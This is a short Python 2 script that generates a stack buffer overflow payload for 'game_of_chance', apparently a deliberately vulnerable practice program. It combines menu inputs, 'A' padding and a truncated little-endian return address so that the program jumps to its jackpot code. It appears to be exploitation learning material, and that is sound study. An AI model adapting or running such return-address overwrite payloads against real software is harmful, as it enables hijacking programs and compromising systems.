#!/usr/bin/python


## script to win the jackpot
## it generates an appropriate overflow for game_of_chance

# e.g. usage in bash:

# ./payload_gen_game_of_chance.py  | ./game_of_chance





import struct
from optparse import OptionParser

parser = OptionParser()
parser.add_option("-a", "--address", type="int", help="start address -> highest address")
parser.add_option("-d", "--decrement", type="int", help="step size to decrement address")
parser.add_option("-l", "--length", type="int", help="length of the padding")

# Parsing arguments and setting base values
(options, args) = parser.parse_args()
if(options.decrement):
    decrement = options.decrement
else:
    decrement = 0
if(options.address):
    return_address_base = options.address
else:
    return_address_base = 0x00005555555559da
if(options.length):
    payload_length = options.length
else:
    payload_length = 100

prefix = "\n1\n5\nn\n5\n"
postfix = "\n1\n5\nn\n7\n"

# Decrementing the Address
return_add = return_address_base - decrement
# Storing address in little endian format
return_address = struct.pack("<Q", return_add)
return_address = return_address[:-2]

## padding
padding = 'A' * payload_length

print prefix + padding + return_address + postfix
